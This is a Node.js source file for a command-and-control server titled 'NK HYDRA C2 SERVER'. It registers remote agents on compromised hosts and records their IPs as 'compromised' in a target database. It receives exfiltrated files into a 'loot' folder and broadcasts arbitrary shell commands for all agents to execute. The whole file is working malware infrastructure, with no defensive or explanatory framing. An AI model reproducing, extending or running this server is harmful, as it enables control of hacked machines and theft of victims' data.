// NK HYDRA C2 SERVER v10.0 (WARLORD ELITE)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" }, 
    maxHttpBufferSize: 1e8
}); 

const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

// CMDB: Persistent Target Database
const CMDB_FILE = path.join(__dirname, 'cmdb.json');
let targets = {}; // IP -> { os, ports, status, vulns }

if (fs.existsSync(CMDB_FILE)) {
    try { targets = JSON.parse(fs.readFileSync(CMDB_FILE)); } catch(e){}
}

const saveCMDB = () => fs.writeFileSync(CMDB_FILE, JSON.stringify(targets, null, 2));

app.use(cors());
app.use(express.json());

let agents = new Map();

// Helper to broadcast status & CMDB
const broadcastState = () => {
    io.emit('status', { 
        agents: agents.size, 
        active: true,
        targets: targets 
    });
};

// 1. DASHBOARD
app.get('/', (req, res) => {
    res.json({ status: 'Online', agents: agents.size, loot_count: fs.readdirSync(LOOT_DIR).length });
});

// 2. SOCKET HANDLER
io.on('connection', (socket) => {
    broadcastState();

    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = { ...data, socketId: socket.id, ip: socket.handshake.address.replace('::ffff:', '') };
            agents.set(data.id, agentInfo);
            
            // Auto-Register in CMDB
            if (!targets[agentInfo.ip]) {
                targets[agentInfo.ip] = { ip: agentInfo.ip, os: data.os, status: 'compromised', vulns: [], openPorts: [] };
                saveCMDB();
            } else {
                targets[agentInfo.ip].status = 'compromised';
                saveCMDB();
            }

            console.log(`[+] ELITE AGENT: ${data.id}`);
            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${data.id}`);
            broadcastState();
        } 
    });

    socket.on('stream_log', (data) => {
        io.emit('log', `[${data.from}][${data.type}] ${data.output}`);
    });

    socket.on('file_exfil', (data) => {
        try {
            const safeName = path.basename(data.filename).replace(/[^a-zA-Z0-9._-]/g, '_');
            const filePath = path.join(LOOT_DIR, `${data.from}_${Date.now()}_${safeName}`);
            fs.writeFileSync(filePath, Buffer.from(data.data, 'base64'));
            io.emit('log', `[LOOT] Saved: ${safeName}`);
        } catch (e) {}
    });

    socket.on('cmd', (data) => {
        io.emit('exec', { cmd: data.cmd });
    });

    socket.on('disconnect', () => {
        agents.forEach((val, key) => {
            if (val.socketId === socket.id) agents.delete(key);
        });
        broadcastState();
    });
});

server.listen(process.env.PORT || 3000);